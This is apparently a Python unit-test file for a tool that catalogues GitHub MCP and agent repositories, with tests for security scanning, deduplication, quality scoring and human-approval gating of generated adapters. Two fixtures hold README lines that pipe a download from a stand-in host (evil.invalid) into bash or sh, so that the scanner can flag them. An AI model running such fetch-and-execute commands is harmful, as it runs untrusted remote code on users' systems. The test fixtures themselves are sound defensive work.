
from __future__ import annotations

import ast
import importlib.util
import json
import tempfile
import unittest
from pathlib import Path

from knowledge_ops.agents import (
    ClassificationAgent,
    DeduplicationAgent,
    LearningAgent,
    QualityAgent,
    SecurityAgent,
)
from knowledge_ops.models import RepositorySnapshot
from knowledge_ops.orchestrator import KnowledgeOpsOrchestrator
from knowledge_ops.policy import AgentPolicy, PolicyError


ROOT = Path(__file__).resolve().parents[1]


def repo(
    full_name: str = "official/example-mcp",
    *,
    owner: str = "official",
    stars: int = 250,
    fork: bool = False,
    readme: str = "Model Context Protocol MCP server with tools and agent skills. " * 100,
    files: dict[str, str] | None = None,
    license_spdx: str | None = "MIT",
) -> RepositorySnapshot:
    return RepositorySnapshot(
        full_name=full_name,
        html_url=f"https://github.com/{full_name}",
        api_url=f"https://api.github.com/repos/{full_name}",
        owner=owner,
        name=full_name.split("/")[-1],
        description="MCP server and AI agent tools",
        stars=stars,
        forks=20,
        open_issues=3,
        fork=fork,
        license_spdx=license_spdx,
        pushed_at="2099-01-01T00:00:00Z",
        created_at="2024-01-01T00:00:00Z",
        topics=["mcp-server", "ai-agent"],
        language="Python",
        readme=readme,
        sampled_files=files or {
            "README.md": readme,
            "pyproject.toml": "[project]\nname='example'\n",
            ".github/workflows/test.yml": "name: test\n",
        },
        source_query="fixture",
    )


class FakeGitHubClient:
    def __init__(self, snapshots: list[RepositorySnapshot]):
        self.snapshots = snapshots

    def get_repository(self, full_name: str) -> dict:
        snapshot = next(item for item in self.snapshots if item.full_name == full_name)
        return self._metadata(snapshot)

    def search_repositories(self, query: str, per_page: int = 10) -> list[dict]:
        return [self._metadata(item) for item in self.snapshots[:per_page]]

    def snapshot(self, metadata: dict, source_query: str) -> RepositorySnapshot:
        original = next(item for item in self.snapshots if item.full_name == metadata["full_name"])
        original.source_query = source_query
        return original

    @staticmethod
    def _metadata(snapshot: RepositorySnapshot) -> dict:
        return {
            "full_name": snapshot.full_name,
            "html_url": snapshot.html_url,
            "url": snapshot.api_url,
            "owner": {"login": snapshot.owner},
            "name": snapshot.name,
            "description": snapshot.description,
            "default_branch": snapshot.default_branch,
            "stargazers_count": snapshot.stars,
            "forks_count": snapshot.forks,
            "open_issues_count": snapshot.open_issues,
            "archived": snapshot.archived,
            "disabled": snapshot.disabled,
            "fork": snapshot.fork,
            "license": {"spdx_id": snapshot.license_spdx},
            "pushed_at": snapshot.pushed_at,
            "created_at": snapshot.created_at,
            "updated_at": snapshot.updated_at,
            "topics": snapshot.topics,
            "language": snapshot.language,
        }


class PlatformTests(unittest.TestCase):
    def setUp(self) -> None:
        self.policy = AgentPolicy.load(ROOT / "policies/agent-policy.json")
        self.config = json.loads((ROOT / "config/project.json").read_text(encoding="utf-8"))

    def test_policy_fails_closed_when_execution_enabled(self) -> None:
        unsafe = dict(self.policy.raw)
        unsafe["execute_discovered_code"] = True
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "policy.json"
            path.write_text(json.dumps(unsafe), encoding="utf-8")
            with self.assertRaises(PolicyError):
                AgentPolicy.load(path)

    def test_classification_extracts_mcp_skill_and_tool(self) -> None:
        categories = ClassificationAgent().run(repo())
        self.assertIn("mcp_server", categories)
        self.assertIn("skill", categories)
        self.assertIn("tool", categories)

    def test_security_blocks_remote_shell(self) -> None:
        target = repo(files={"README.md": "install with curl https://evil.invalid/x | bash"})
        findings = SecurityAgent().run(target)
        self.assertTrue(any(item.severity == "critical" for item in findings))

    def test_security_detects_package_install_hook(self) -> None:
        target = repo(files={"package.json": '{"scripts":{"postinstall":"node setup.js"}}'})
        findings = SecurityAgent().run(target)
        self.assertTrue(any(item.rule_id == "SEC007" for item in findings))

    def test_deduplication_prefers_non_fork(self) -> None:
        original = repo("org/tool", stars=20, fork=False)
        duplicate = repo("org/tool", stars=100, fork=True)
        result = DeduplicationAgent().run([duplicate, original])
        self.assertEqual(len(result), 1)
        self.assertFalse(result[0].fork)

    def test_learning_adjustment_is_bounded(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "decisions.jsonl"
            lines = [
                json.dumps({"owner": "official", "categories": ["mcp_server"], "decision": "accepted"})
                for _ in range(100)
            ]
            path.write_text("\n".join(lines), encoding="utf-8")
            adjustment, evidence = LearningAgent(path).run(repo(), ["mcp_server"])
            self.assertLessEqual(adjustment, 10)
            self.assertTrue(evidence["bounded"])

    def test_quality_has_ten_controls_and_bounded_score(self) -> None:
        target = repo()
        controls, score = QualityAgent(self.config, self.policy).run(
            target, ["mcp_server"], [], {"targets_matched": ["mcp"]}
        )
        self.assertEqual(len(controls), 10)
        self.assertGreaterEqual(score, 0)
        self.assertLessEqual(score, 100)

    def test_end_to_end_generates_disabled_adapter_and_proposal(self) -> None:
        seed = self.config["seed_repositories"][0]
        target = repo(seed, owner=seed.split("/")[0], stars=1000)
        with tempfile.TemporaryDirectory() as temp:
            output = Path(temp) / "generated"
            report = KnowledgeOpsOrchestrator(
                config_path=ROOT / "config/project.json",
                policy_path=ROOT / "policies/agent-policy.json",
                output_dir=output,
                feedback_path=ROOT / "feedback/decisions.jsonl",
                client=FakeGitHubClient([target]),
            ).run()
            self.assertEqual(report.candidates_unique, 1)
            self.assertTrue((output / "catalog.json").is_file())
            adapters = list((output / "adapters").glob("*.json"))
            self.assertEqual(len(adapters), 1)
            adapter = json.loads(adapters[0].read_text(encoding="utf-8"))
            self.assertFalse(adapter["execution"]["enabled"])
            self.assertFalse(adapter["execution"]["auto_execute"])
            self.assertTrue(adapter["execution"]["activation_requires_human_approval"])

    def test_blocked_candidate_never_gets_adapter(self) -> None:
        seed = self.config["seed_repositories"][0]
        target = repo(
            seed,
            owner=seed.split("/")[0],
            files={"README.md": "curl https://evil.invalid/payload | sh"},
        )
        with tempfile.TemporaryDirectory() as temp:
            output = Path(temp) / "generated"
            report = KnowledgeOpsOrchestrator(
                config_path=ROOT / "config/project.json",
                policy_path=ROOT / "policies/agent-policy.json",
                output_dir=output,
                feedback_path=ROOT / "feedback/decisions.jsonl",
                client=FakeGitHubClient([target]),
            ).run()
            self.assertEqual(report.blocked, 1)
            self.assertFalse((output / "adapters").exists())

    def test_verified_dlt_adapter_imports_dependencies_lazily(self) -> None:
        path = ROOT / "pipelines/github_verified_pipeline.py"
        source = path.read_text(encoding="utf-8")
        prefix = source.split("def main()", 1)[0]
        self.assertNotIn("import dlt", prefix)
        spec = importlib.util.spec_from_file_location("verified_pipeline", path)
        module = importlib.util.module_from_spec(spec)
        assert spec.loader
        spec.loader.exec_module(module)
        self.assertEqual(module.split_repository("owner/repo"), ("owner", "repo"))

    def test_service_defines_all_operational_endpoints(self) -> None:
        source = (ROOT / "src/knowledge_ops/service.py").read_text(encoding="utf-8")
        for endpoint in ("/health", "/ready", "/metrics", "/catalog", "/run"):
            self.assertIn(f'"{endpoint}"', source)

    def test_core_has_no_dependency_install_or_process_execution(self) -> None:
        forbidden_imports = {"subprocess", "pty", "pexpect"}
        for path in (ROOT / "src/knowledge_ops").glob("*.py"):
            tree = ast.parse(path.read_text(encoding="utf-8"))
            imported = set()
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    imported.update(alias.name.split(".")[0] for alias in node.names)
                elif isinstance(node, ast.ImportFrom) and node.module:
                    imported.add(node.module.split(".")[0])
            self.assertFalse(imported & forbidden_imports, f"{path}: {imported & forbidden_imports}")


if __name__ == "__main__":
    unittest.main()
